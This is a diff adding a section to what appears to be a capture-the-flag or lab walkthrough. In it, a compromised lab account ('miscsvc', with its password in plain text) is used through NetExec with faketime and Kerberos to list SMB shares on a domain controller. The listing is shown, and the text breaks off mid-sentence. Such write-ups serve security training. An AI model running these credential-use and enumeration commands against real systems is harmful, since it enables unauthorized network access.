@@ -394,3 +394,22 @@ SMB         dc1.scrm.local  445    dc1              [+] scrm.local\miscsvc:Scram
 ```
 This user is compromised
 
+## Access as `miscsvc`
+```python
+faketime '17:57:47.260372' nxc smb dc1.scrm.local -u 'miscsvc' -p 'ScrambledEggs9900' -k --shares
+SMB         dc1.scrm.local  445    dc1              [*]  x64 (name:dc1) (domain:scrm.local) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc1.scrm.local  445    dc1              [+] scrm.local\miscsvc:ScrambledEggs9900 
+SMB         dc1.scrm.local  445    dc1              [*] Enumerated shares
+SMB         dc1.scrm.local  445    dc1              Share           Permissions     Remark
+SMB         dc1.scrm.local  445    dc1              -----           -----------     ------
+SMB         dc1.scrm.local  445    dc1              ADMIN$                          Remote Admin
+SMB         dc1.scrm.local  445    dc1              C$                              Default share
+SMB         dc1.scrm.local  445    dc1              HR                              
+SMB         dc1.scrm.local  445    dc1              IPC$            READ            Remote IPC
+SMB         dc1.scrm.local  445    dc1              IT              READ            
+SMB         dc1.scrm.local  445    dc1              NETLOGON        READ            Logon server share 
+SMB         dc1.scrm.local  445    dc1              Public          READ            
+SMB         dc1.scrm.local  445    dc1              Sales                           
+SMB         dc1.scrm.local  445    dc1              SYSVOL          READ            Logon server share
+```
+I now 
